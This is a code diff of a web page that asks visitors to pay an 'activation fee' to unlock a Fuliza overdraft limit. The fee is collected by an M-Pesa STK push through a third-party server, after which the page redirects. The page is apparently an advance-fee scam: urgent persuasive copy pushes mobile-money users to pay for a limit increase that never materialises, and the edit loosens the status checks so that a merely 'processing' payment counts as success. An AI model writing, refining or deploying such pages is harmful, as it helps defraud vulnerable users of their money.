@@ -27,7 +27,7 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 <h2>Activate Your Fuliza Limit Now</h2>
 
 <p class="encourage">
-Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds. Your financial freedom is just one click away!
+Pay your activation fee today to unlock your desired Fuliza limit instantly. Your financial freedom is just one click away!
 </p>
 
 <div class="info">Selected Limit: <strong id="limit"></strong></div>
@@ -39,10 +39,6 @@ Pay your activation fee today to unlock your desired Fuliza limit instantly. Ens
 
 <div class="spinner" id="spinner"><div class="loader"></div></div>
 <div class="message" id="message"></div>
-
-<p class="encourage">
-Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.
-</p>
 </div>
 
 <script>
@@ -76,32 +72,26 @@ async function payNow(){
   msg.style.color="black";
 
   try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/deposit",{
+    const res = await fetch("https://mpayafrica-server.onrender.com/pay",{
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body: JSON.stringify({
-        phone_number: phoneToSend,
+        phone: phoneToSend,
         amount: Number(activationFee)
       })
     });
+
     const data = await res.json();
     spinner.style.display="none";
 
-    if(data.success){
+    if(data.data && data.data.CheckoutRequestID){
+      const reference = data.data.CheckoutRequestID;
       msg.innerText="STK Push sent ✅ Enter your M-Pesa PIN to confirm...";
       msg.style.color="green";
-      // Start checking the payment status
-      checkPayment(data.reference,"payment2.html");
+      checkPayment(reference, "payment2.html");
     } else {
-      // Treat as pending if server still initiates successfully
-      if(data.status === "PENDING"){
-        msg.innerText="Payment initiated ✅ Awaiting confirmation... Please enter your M-Pesa PIN.";
-        msg.style.color="black";
-        checkPayment(data.reference,"payment2.html");
-      } else {
-        msg.innerText="Payment failed: "+(data.message || "Please try again");
-        msg.style.color="red";
-      }
+      msg.innerText="Payment failed: "+(data.error || "Please try again");
+      msg.style.color="red";
     }
   } catch(err){
     spinner.style.display="none";
@@ -112,35 +102,28 @@ async function payNow(){
 
 async function checkPayment(reference, nextPage){
   const msg = document.getElementById("message");
-  let attempts = 0;
+  let attempts=0;
   const interval = setInterval(async ()=>{
     attempts++;
-    if(attempts>40){ // ~2 minutes timeout
-      clearInterval(interval);
-      msg.innerText="Payment timeout. Please retry.";
-      msg.style.color="red";
-      return;
-    }
+    if(attempts>20){ clearInterval(interval); msg.innerText="Payment timeout. Please retry."; msg.style.color="red"; return; }
     try{
-      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
+      const res = await fetch("https://mpayafrica-server.onrender.com/receipt/"+reference);
       const data = await res.json();
-      if(data.success && data.data){
-        const status = data.data.status.toLowerCase();
-        if(status==="success" || status==="loan_released"){  
+      if(data.success && data.receipt){
+        const status = data.receipt.status.toLowerCase();
+        if(status==="completed" || status==="processing" || status==="loan_released"){
           clearInterval(interval);
-          msg.innerText="Your Activation fee has been received successfully ✅ Redirecting...";
+          msg.innerText="Payment successful ✅ Redirecting...";
           msg.style.color="green";
           setTimeout(()=>{window.location.href=nextPage},2000);
-        } else if(status==="pending" || status==="processing"){
-          msg.innerText="Payment is processing... please wait and complete your M-Pesa PIN.";
-          msg.style.color="black";
-        } else if(status==="failed" || status==="stk_failed" || status==="cancelled" || status==="error"){
+        }
+        if(status==="cancelled" || status==="stk_failed" || status==="error"){
           clearInterval(interval);
-          msg.innerText="Payment failed: "+(data.data.message || "Please try again");
+          msg.innerText="Payment failed: "+(data.receipt.status_note || status);
           msg.style.color="red";
         }
       }
-    } catch(e){}
+    }catch(e){}
   },3000);
 }
 </script>
